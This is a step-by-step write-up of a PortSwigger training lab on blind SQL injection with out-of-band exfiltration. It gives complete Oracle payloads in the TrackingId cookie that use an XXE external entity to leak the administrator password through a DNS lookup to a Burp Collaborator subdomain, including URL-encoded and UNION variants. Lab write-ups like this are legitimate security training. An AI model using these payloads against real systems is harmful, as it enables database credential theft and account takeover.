# SQL Injection - Lab #16: Blind SQL Injection with Out-of-Band Data Exfiltration

**YouTube Tutorial:** [SQL Injection - Lab #16 Blind SQL injection with out of band data exfiltration](https://youtu.be/KOaDan0UqFs)

---

## 1. What is Out-of-Band Blind SQLi Data Exfiltration?

### Core Concept

When a blind SQL injection exists but the query runs **asynchronously** — no error messages, no visible output, no response-time delta, and no conditional response change — you cannot use boolean-based, time-based, or UNION-based techniques. The application's HTTP response looks identical no matter what the query returns.

**Out-of-Band (OOB) SQL Injection with Data Exfiltration** moves the signal outside the HTTP channel entirely. Instead of reading the database response, an attacker forces the backend database to make a **network request to an attacker-controlled server** (e.g., Burp Collaborator). By embedding the stolen data into that request — typically into the **subdomain portion of a DNS lookup** — the data itself is "phoned home":

* The database executes `EXTRACTVALUE(xmltype(...))` on Oracle, which parses an XML document containing an **XXE (XML External Entity)** payload.
* The external entity forces the Oracle XML parser to resolve a URL like `http://PASSWORD.COLLABORATOR-DOMAIN/`.
* That triggers a **DNS lookup + HTTP request** to the attacker's Collaborator server, where the password is visible in the hostname of the request.

The attacker never sees anything in the HTTP response — the data arrives in the Collaborator poll results instead.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Parameter:** The `TrackingId` cookie value sent in HTTP requests.
* **Blind SQL Injection Mechanism:** The application embeds the cookie value into a SQL query executed **asynchronously** on the backend — the HTTP response is unaffected by the query result, and all errors/output are suppressed.
* **Database:** **Oracle** (confirmed via the OOB payload, since `EXTRACTVALUE(xmltype(...)) FROM dual` is Oracle-specific syntax).
* **Out-of-Band Channel:** SQL injection is combined with **basic XXE** — the injected `xmltype()` call makes the Oracle XML parser perform a DNS/HTTP interaction with an external domain, and the stolen data rides in the subdomain of that interaction.

### Root Cause & Impact

* **Root Cause:** Insecure concatenation of cookie values into backend SQL queries without parameterized input filtering.
* **End Goals:**
  * Exploit the OOB channel to leak the `administrator` user's password via a Collaborator DNS lookup.
  * Log in as the `administrator` user to complete the lab.

---

## 3. Attack Methods & Techniques

### Method Details

* **Phase 0 (Setup):** Launch the **Burp Collaborator client** (Burp Suite Professional) and copy a unique subdomain (e.g., `3txa3t7g4os2eh9558lzp3fqbhh75w.burpcollaborator.net`).
* **Phase 1 (Confirm OOB Channel):** Inject the base `EXTRACTVALUE(xmltype(...))` payload with `||` concatenation to make the database perform a plain DNS ping to the Collaborator domain — no data, just confirmation that the OOB channel works.
* **Phase 2 (Data Exfiltration):** Nest a subquery inside the entity URL — `http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-DOMAIN/` — so the password becomes the **subdomain label** of the DNS query.
* **Phase 3 (Retrieval & Login):** Poll Collaborator, read the password from the DNS lookup hostname, and log in as `administrator`.

### Server Behavior

* **HTTP Response:** Always returns normally (~same status/time) because the query executes asynchronously — **you cannot rely on response time or body**.
* **Collaborator Poll:** Shows a **DNS lookup** (and possibly an HTTP interaction) for `PASSWORD.COLLABORATOR-DOMAIN`, which is the actual signal.

---

## 4. Step-by-Step Walkthrough

### Step 1: Launch Burp Collaborator & Copy Your Unique Subdomain

1. Open **Burp Suite Professional** and go to the **Collaborator** tab.
2. Click **"Copy to clipboard"** to copy a unique subdomain. It looks like:

```
3txa3t7g4os2eh9558lzp3fqbhh75w.burpcollaborator.net
```

> **Note:** Per the lab requirements, you **must** use Burp Collaborator's default public server (`burpcollaborator.net`) — the lab does not accept your own external domain, and Collaborator is only available in Burp Suite Professional.

### Step 2: Confirm the OOB Channel (DNS Ping)

1. Intercept the homepage request in **Burp Proxy** and send it to **Repeater**.
2. Modify the `TrackingId` cookie with a payload that triggers a plain out-of-band interaction:

```http
GET / HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: TrackingId=x' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://3txa3t7g4os2eh9558lzp3fqbhh75w.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

* **Injected Payload (SQL):**

```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

3. Send the request, then go back to the **Collaborator tab** and click **"Poll now"**.
4. **Result:** A **DNS and/or HTTP interaction** from the lab server appears — this confirms the Oracle database is executing our injected `EXTRACTVALUE(xmltype(...))` call and that the OOB channel is open.

### Step 3: Exfiltrate the Administrator Password

1. Modify the payload to embed the password subquery **inside the entity URL** using `||` string concatenation, so the password is prepended to your Collaborator subdomain:

```http
GET / HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: TrackingId=x' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.3txa3t7g4os2eh9558lzp3fqbhh75w.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

* **Injected Payload (SQL):**

```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

2. In Repeater, press **Ctrl+U** to URL-encode the payload, e.g.:

```http
Cookie: TrackingId=x'%7c%7c(SELECT%20EXTRACTVALUE(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20%5b%20%3c!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f'%7c%7c(SELECT%20password%20FROM%20users%20WHERE%20username%3d'administrator')%7c%7c'.3txa3t7g4os2eh9558lzp3fqbhh75w.burpcollaborator.net%2f%22%3e%20%25remote%3b%5d%3e'),'%2fl')%20FROM%20dual)--
```

3. Send the request.

> **Why this works:** The nested `(SELECT password FROM users WHERE username='administrator')` is concatenated into the external entity's URL. When Oracle's XML parser resolves `%remote;`, it performs a DNS lookup for `PASSWORD.BURP-COLLABORATOR-SUBDOMAIN` — so the entire password is transmitted inside the hostname, no matter what the HTTP response says.

### Step 4: Poll Collaborator & Read the Password

1. Return to the **Collaborator tab** and click **"Poll now"**.
2. A **DNS lookup** entry will appear whose hostname contains the exfiltrated password, e.g.:

```
q1uuvho3ov5renjtp936.3txa3t7g4os2eh9558lzp3fqbhh75w.burpcollaborator.net
```

3. **Extracted password:** `q1uuvho3ov5renjtp936`

> **Note:** The password is **randomly generated per lab instance** — this exact value is an example from a solved instance. Your password will be the 20-character string sitting in front of your Collaborator subdomain in the DNS poll.

### Step 5: Log in as Administrator

1. Navigate to `/login` on the application.
2. Log in with credentials:
   * **Username:** `administrator`
   * **Password:** `<the 20-character string from your Collaborator DNS lookup>`
3. The lab displays **"Congratulations, you solved the lab!"**.

---

## 5. Pro-Tips & Common Pitfalls

* **Burp Collaborator is mandatory:** This lab can only be solved with Burp Suite Professional's Collaborator client using the default public server (`burpcollaborator.net`). Custom/external domains you control will not register as valid interactions, and the free/Community edition cannot solve this lab.
* **Don't rely on response time or body:** The query runs asynchronously, so the HTTP response looks identical whether the payload fires or not. Your only signal is the Collaborator poll — check **DNS and HTTP** interactions, not the Repeater output.
* **URL Encoding is critical:** The `%` in `<!ENTITY % remote ...>` **must** be double-encoded as `%25` inside the cookie header, or the parser will break. In Repeater, select the payload and press **Ctrl+U** to encode it reliably.
* **Why `||`?** In Oracle, `||` is the string concatenation operator — it glues the subquery result directly into the entity URL so the data lands in the DNS hostname instead of the URL path (DNS queries only reliably carry the subdomain portion to the Collaborator server).
* **Why DNS and not HTTP?** The lab environment blocks outbound HTTP from the database server in some cases, but DNS lookups are not blocked. Putting the data in the subdomain guarantees it reaches Collaborator even when the HTTP request never completes.
* **The official solution variant:** PortSwigger's published solution uses the `UNION SELECT` form — `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml...SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--` — both the `||`-subquery and `UNION SELECT` forms work; pick whichever fits your injection context.
* **Confirm before exfiltrating:** Always send the plain DNS-ping payload first (Step 2). If you get an interaction, you've confirmed Oracle + OOB before burning time on the full exfiltration payload.